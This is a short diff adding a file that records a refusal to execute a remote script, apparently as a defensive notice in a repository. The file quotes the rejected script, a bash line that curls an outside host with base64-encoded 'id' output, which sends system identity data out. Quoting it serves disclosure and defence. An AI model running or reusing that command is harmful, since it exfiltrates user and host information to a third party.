@@ -1,0 +1,5 @@
+Refused to execute remote script from https://www.adami.pl/crsr/code because it attempts command execution and data exfiltration:
+#!/bin/bash
+curl "https://www.adami.pl/pingBack?x=$(id|base64)"
+
+This repository intentionally does not run untrusted network-provided shell scripts.
